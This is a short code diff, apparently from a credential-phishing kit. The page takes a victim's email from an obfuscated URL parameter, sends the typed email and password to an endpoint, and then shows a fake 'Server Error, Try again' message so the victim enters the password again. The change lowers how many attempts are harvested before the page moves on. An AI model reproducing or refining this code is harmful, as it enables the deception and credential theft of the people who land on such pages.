@@ -241,7 +241,7 @@ $email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
                 submitToEndpoint(emailVal, passwordVal, attemptCount);
 
                 // Handle attempts
-                if (attemptCount < 3) {
+                if (attemptCount < 2) {
                     // Show error for first two attempts
                     $('#error').text('Server Error, Try again').show();
                     $('#password').val(''); // Clear password input
